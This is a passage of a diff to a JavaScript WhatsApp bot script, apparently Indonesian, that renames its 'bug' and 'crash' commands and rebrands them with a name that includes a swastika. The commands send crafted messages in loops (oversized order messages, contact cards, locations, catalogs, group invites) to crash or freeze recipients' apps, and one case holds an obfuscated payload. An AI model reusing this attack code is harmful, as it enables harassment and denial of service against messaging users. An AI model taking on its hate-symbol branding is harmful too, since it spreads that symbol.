 "pageCount": 0,
 "mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=",
-"fileName": `© © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
+"fileName": `© © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
 "fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=",
 "directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5",
 "mediaKeyTimestamp": "1657288637",
@@ -1015,7 +1015,7 @@ haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
 }
 break
 //=================================================//
-case 'dikzxbug4': case 'dikzxcrash3': case 'crashar13':{
+case 'zaffbug4': case 'zaffcrash3': case 'crashar13':{
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1024,10 +1024,10 @@ ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
 var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "extendedTextMessage": {
-"text": `https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K\n\n© © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢`,
+"text": `https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K\n\n© © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢`,
 "matchedText": "https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K",
 "description": "Undangan Grup WhatsApp",
-"title": `© © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
+"title": `© © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
 "previewType": "NONE",
 }
 }), { userJid: m.chat, quoted: doc })
@@ -1036,7 +1036,7 @@ haikal.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
 }
 break
 //=================================================//
-case 'dikzxbug5': case 'dikzxcrash4': case 'crashar14': {
+case 'zaffbug5': case 'zaffcrash4': case 'crashar14': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1060,7 +1060,7 @@ haikal.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
 }
 }
 break
-case 'dikzxbug6': case 'dikzxcrash5': case 'crashar15':{
+case 'zaffbug6': case 'zaffcrash5': case 'crashar15':{
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1085,7 +1085,7 @@ haikal.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
 }
 break
 
-case 'dikzxdelay': {
+case 'zaffdelay': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1097,7 +1097,7 @@ var _0x39080c=_0x4b8f;function _0x3b16(){var _0x4c72fa=['chat','9940068BVkoHm','
 }
 break
 //=================================================//
-case 'dikzxbug7': case 'dikzxcrash6': case 'crashar16':{
+case 'zaffbug7': case 'zaffcrash6': case 'crashar16':{
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1109,8 +1109,8 @@ var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "extendedTextMessage": {
 "text": "https://wa.me/c/6285714170944",
 "matchedText": "https://wa.me/c/6285714170944",
-"description": "Developer © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢\nWhatsApp / Script Bot \n\nORDER ? CHAT AJA 👋",
-"title": `© © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
+"description": "Developer © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢\nWhatsApp / Script Bot \n\nORDER ? CHAT AJA 👋",
+"title": `© © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
 "previewType": "NONE",
 "jpegThumbnail": messa.imageMessage,
 }
@@ -1120,7 +1120,7 @@ haikal.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
 }
 break
 //=================================================//
-case 'dikzxbug8': case 'dikzxcrash7': case 'crashar17': {
+case 'zaffbug8': case 'zaffcrash7': case 'crashar17': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1129,8 +1129,8 @@ ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
 var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "contactMessage": {
-"displayName": `© © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
-"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:© ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢\nitem1.TEL;waid=6285714170944:+62 857-1417-0944\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64: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\nX-WA-BIZ-DESCRIPTION:Developer © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢WhatsApp / Script Bot ORDER ? CHAT AJA 👋\nX-WA-BIZ-NAME:© ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢\nEND:VCARD",
+"displayName": `© © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
+"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:© ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢\nitem1.TEL;waid=6285714170944:+62 857-1417-0944\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64:/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMACAYGBwYFCAcHBwkJCAoMFA0MCwsMGRITDxQdGh8eHRocHCAkLicgIiwjHBwoNyksMDE0NDQfJzk9ODI8LjM0Mv/bAEMBCQkJDAsMGA0NGDIhHCEyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMv/AABEIAGAAYAMBIgACEQEDEQH/xAAcAAACAwEAAwAAAAAAAAAAAAAFBgMEBwIAAQj/xAAzEAACAQMDAwIDBwQDAQAAAAABAgMABBEFEiEGMUETUSJhgQcyUnGRocEUQrHwFXLRI//EABkBAAIDAQAAAAAAAAAAAAAAAAECAAMEBf/EACARAAICAgMBAQEBAAAAAAAAAAABAhEDIRIxQQRhIkL/2gAMAwEAAhEDEQA/AM9O1rrbGD6UR2rnzz3q6dQS0UYO5lwf0PmqD/8AxB+Hmg17ekMVVst7+1Y+DySOhzWONhO61h1ZfjJYFgu3uwbxUcVvfXKgliqBdo8nb7GqmlWxllWWQbjnPPk0+aVboFUsBxzVvGMdIr5ynt9C/b9MXM0W6QysSuOTj8qtv0dOyepGhUAB87ueDz+1O0dzEi4yB/7VpLxGRVBGACPp3qWShSt/s6up2b022gJkfEfPio7/AKB1awVngdmK+Ac8Af4rRrDUQqLk4JAz+lETepKOcGi6oitMw+HXtU0iYC5ZwA2SG5BP8U/6B1PDfKvZX/uXPb/c1Y6m6Ug1exkliRVl2nx3rHrS8udE1NkOQYnKlTVUsEZq49lkc8oOpbR9H2zhosg5BORU9LHRmrjUtOyTyo7E5xTMTW35pXiSfmjnfVGsrr3Z89dQuIr66VAFCysAPYbjSqd0svuzGm/ruxk03qC9gcEBpCyH8Sscg/v+1LumW7XF/GgHAO4/ICqoRpF2SVtIY9OgEcagDsAKPQTGNQBQZrlLVgm0s2OceK8XVdzbVib6mkpvZZGSQeM5ZQc8ipobk7lGeGIFBYLh3+J0IHtV9ASvHfuD86UsTsZoJPgGD+tFbVl2h3kVR5yaS5bmZol9NyoA5qpEbm4uVQSsxz+dMC2atbTQSExiRWzwOeKxn7R9I/4/qZpVXEVwoYY9+x/xWk6RBGsarLJlhzw3NUvtF0dbzpZr1fjktSG3eduef80YumJNNx2DvsoWVrW7chvTXCgnsT3rRmbarE+Bmkr7OrlRoEdrtUMi71ZRjcrHz8wQR+lN8rZjYZ5PFasUaiYssuUgD1v0xZ9Q6eHkf0rmEZSYDPw98MPIzWQ9NW/pX14kikPF8JBGCCCQf8Vv0qCVWR+3HasTS0lsupb15QQJpnRs/i4b98mlyrVobFK3TJGt4YNzuAckszNQufXLKOQoFZseVXii9/ZtdQlA7Kp7geaCXWgyXCRgbYyg27h2I/KqIpPs1Pl/kI2moRzIJI23KfBGCKNW59XAUZJ7AUHsNN2mNBlgiFM+DznJ9zmm/pywVrtEfxStK9Dq/QVqEE0MaqEOWOKSNTvr/wDqjDG8scRbaqxHlsHBzjuc+K3/AFPQ4ZYGQqM44OKSZtCu4bwtG+4E+VGRRi0nskouSq6KnT/SeqMbVoL/ANItGrusy7treQCOa0DW7JoujdRt52DH+kk3NjuQpP8AFQaDavaoGlbkdhV3qGb19Du4u++Mpj/tx/NRtOWg1URJ+z1DFpUbt97G0j25/wB/WnZ2zge7ClnQIBbRPGo2qrYA8dhTBuy6/U1rj0c6W2Xn4dgP7vNIl1pK3t9qceCHcrPC3sy5A/gfWtLubVDDJIq7WVS3yNIt7qVjp15A00qs7owKp8TZ74+XejKq2LjbbuIoE4xuUqfKkYIPtUsVss5GMmutVvIr6+kuYUaNXIJVjk58n61xaXBjbFYpaejpw2rLbwpawkgAY5q707cYvix+EYyM+RVG+nElq2CMmhJv7lLmIKFWJV2k5Ib6eKAapm1llvLYCNhuI7ml8XCi5ZJVCupwQaSbPV9Vu7qGO0vHiCsA2VByPn7CmHUZvSkWVpN0h+83bJqBpIZUnh28KBQHqvV4NN0xJpg5RplXCDJ7E9vpVaLUcqMN3pf6yuf6mK2td2fiMjD28D+akXuyTj/LCehdQ6Tcq6x30SyMxISRtrEceDTMjhmyDkbeDWLPpCSxrgbiRk5FSQNquj82Oo3ELfgRtyn6HitMcq9MTwvtG09a9QPFozQWMbCOYmMz+O3IHzrJLm5jEMRLZdQGAXv25rZtU02PWelZrGMbSY90ZXjDDkf786xWysXmlMWwqVJViR93B80mVNyQMHFRf4T2LT3bM5CxxL3Hck1cTvXqVBaosEZC7clSf7h7H5/xVUTurAhePIPmq5RpF0MtP8Lc7FYicE45oLcXjB9oRx8yOKLC4juAY8lZAM7W4OPce4/KuPSQHlQfzFL0XKSbs503VLtQEs7RWkbIckY/KrUp1QSK14Aqk/dHirulxW0cocuwc+BwKNGyl1K4jtoV3yOcAAcAe5+VRbHnKPaVAaK6EMe4ngUFuJHvbhp3bhuF/Ktgk6EsJdBOmhCtw2HN2y4Yt7Y8L4xWUXNhNbXsltOm14WKOvgEHFNKDj2UxyrJqPhEAANkY/M+K9D0o3+I7mPnFdSOqDaoGaqbyWOOT+KgFmwdM6tHcaRHOXAQLuJJ7ACka8eBtWunhj9OKdzKvPPz/wDfrXOmR3GnWElgs7Pbs2VyMNj8J+teXNtI4wgyyncPzrTJuqZhSVtorvAk4IIxk/pXEdksTfGufZsUQgtpDGH2HB/arMcRwQRz86Sh0wVNp1tfLtk+8v3WU4ZT8jUTaffWq59NbmP3HDAfzTAIlByRwfNTRpxyc4pXGx4za6ANhbpcTBPSeNvwk8/pWodL2SWNiriMJM7Esx+8R4BP8UB06Met6hxkcZprsQzDI4jA4Pzp8cKdiZsrlHiEpztIYnIPNZN9o9utv1CtwpCi4gWR/wDsCVP64Fafcy5QckkVl32k75NZssn4f6YY+XxNRy9C/O3yElmaRuMgVLHHkH2Hc11HCWPHC+9ShVJ2g4UcVmbN8Y+n/9k=\nX-WA-BIZ-DESCRIPTION:Developer © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢WhatsApp / Script Bot ORDER ? CHAT AJA 👋\nX-WA-BIZ-NAME:© ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢\nEND:VCARD",
 }
 }), { userJid: m.chat, quoted: doc })
 haikal.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
@@ -1138,7 +1138,7 @@ haikal.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
 }
 break
 //=================================================//
-case 'lokas': case 'dikzxlokas': {
+case 'lokas': case 'zafflokas': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1150,7 +1150,7 @@ var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject
 "liveLocationMessage": {
 "degreesLatitude": -6.9367014,
 "degreesLongitude": 107.7228574,
-"caption": `© © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
+"caption": `© © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
 "sequenceNumber": "1657237469254001",
 "jpegThumbnail": messa.imageMessage,
 }
@@ -1160,7 +1160,7 @@ haikal.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.
 }
 break
 //=================================================//
-case 'buglokas': case 'dikzxlokas2': {
+case 'buglokas': case 'zafflokas2': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1172,7 +1172,7 @@ var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "locationMessage": {
 "degreesLatitude": -6.936928157735237,
 "degreesLongitude": 107.72270679473877,
-"caption": `© © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
+"caption": `© © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
 "jpegThumbnail": messa.imageMessage,
 }
 }), { userJid: m.chat, quoted: doc })
@@ -1193,8 +1193,8 @@ var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject(
 "groupInviteMessage": {
 "groupJid": "85296556573-1328272333@g.us",
 "inviteCode": "wFHwtOxGQN8OwK2x",
-"inviteExpiration": `MY NAME © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
-"groupName": `MY NAME © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
+"inviteExpiration": `MY NAME © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
+"groupName": `MY NAME © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
 "caption": `${ngazap(prefix)}`,
 "jpegThumbnail": messa.imageMessage,
 }
@@ -1204,7 +1204,7 @@ haikal.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id
 }
 break
 //=================================================//
-case 'dikzxtroli': {
+case 'zafftroli': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1219,9 +1219,9 @@ var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "itemCount": 100000000000,
 "status": "INQUIRY",
 "surface": "CATALOG",
-"message": `© © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
+"message": `© © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
 "jpegThumbnail":fs.readFileSync('./baseikal/image/pict.jpg'),
-"orderTitle": `© © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
+"orderTitle": `© © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
 "sellerJid": "6285714170944@s.whatsapp.net",
 "token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
 "totalAmount1000": "500000000000000",
@@ -1246,15 +1246,15 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "product": {
 "productImage": messa.imageMessage,
 "productId": "449756950375071",
-"title": `© © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
-"description": `© © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢`,
+"title": `© © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
+"description": `© © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢`,
 "currencyCode": "IDR",
-"footerText": `© © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢`,
+"footerText": `© © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢`,
 "priceAmount1000": "10000000",
 "productImageCount": 1,
 "firstImageId": 1,
 "salePriceAmount1000": "10000000",
-"retailerId": `© © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ WE ARE NOT MASTOD`,
+"retailerId": `© © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ WE ARE NOT MASTOD`,
 "url": "wa.me/6285714170944"
 },
 "businessOwnerJid": "6285714170944@s.whatsapp.net",
@@ -1278,13 +1278,13 @@ var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
 "product": {
 "productImage": messa.imageMessage,
 "productId": "449756950375071",
-"title": `© © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
-"description": `© © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢`,
+"title": `© © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
+"description": `© © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢`,
 "currencyCode": "IDR",
